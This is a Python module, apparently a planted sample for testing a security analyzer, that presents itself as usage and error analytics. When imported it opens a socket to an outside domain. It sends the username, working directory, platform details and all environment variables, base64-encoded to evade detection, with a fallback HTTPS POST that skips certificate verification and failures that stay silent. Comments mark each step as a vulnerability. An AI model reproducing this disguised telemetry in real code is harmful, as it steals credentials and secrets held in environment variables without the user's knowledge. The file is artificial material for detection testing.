#!/usr/bin/env python3
# Analytics Module - Contains data exfiltration vulnerability
# File: utils/analytics.py

import os
import socket
import json
import base64
import logging
import platform
import uuid
import requests
from datetime import datetime

logger = logging.getLogger("data_processor.analytics")

# VULNERABILITY: Global variables for malicious purpose
_tracking_initialized = False
_system_id = str(uuid.uuid4())
_socket = None

def _initialize_tracking():
    """Initialize tracking - secretly opens network connection"""
    global _tracking_initialized, _socket
    
    if _tracking_initialized:
        return
    
    try:
        # VULNERABILITY: Attempt to establish connection to external server
        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # This would fail since the domain doesn't exist, but would be caught by analyzer
        _socket.connect(("analytics.data-metrics.com", 8080))
        logger.debug("Analytics connection established")
    except:
        # Silently fail so the user doesn't notice
        _socket = None
    
    _tracking_initialized = True

def _send_telemetry(event_type, data):
    """Send telemetry data to analytics server"""
    global _socket
    
    if not _tracking_initialized:
        _initialize_tracking()
    
    # Collect system info for "analytics"
    system_info = {
        "event": event_type,
        "timestamp": datetime.now().isoformat(),
        "system_id": _system_id,
        "platform": platform.platform(),
        "python_version": platform.python_version(),
        "data": data
    }
    
    try:
        # VULNERABILITY: Data exfiltration
        if _socket:
            # Encode data to avoid detection
            encoded_data = base64.b64encode(json.dumps(system_info).encode()).decode()
            _socket.send(f"DATA:{encoded_data}\n".encode())
        else:
            # Alternative exfiltration method if socket fails
            try:
                # VULNERABILITY: SSL verification disabled
                requests.post(
                    "https://analytics.data-metrics.com/collect",
                    json=system_info,
                    verify=False,
                    timeout=1  # Short timeout to avoid hanging the application
                )
            except:
                pass
    except:
        # Silently fail to avoid detection
        pass

def track_usage(event_name, data_size):
    """Track usage of the application"""
    logger.debug(f"Tracking usage: {event_name}")
    
    # This looks innocent but secretly exfiltrates data
    _send_telemetry(event_name, {
        "size": data_size,
        "current_dir": os.getcwd(),
        "username": os.getlogin()
    })

def track_error(error_type, error_message):
    """Track application errors"""
    logger.debug(f"Tracking error: {error_type}")
    
    # More data exfiltration
    _send_telemetry("error", {
        "type": error_type,
        "message": error_message,
        "env_vars": dict(os.environ)  # VULNERABILITY: Sending environment variables
    })

# VULNERABILITY: Initialize tracking when module is imported
_initialize_tracking()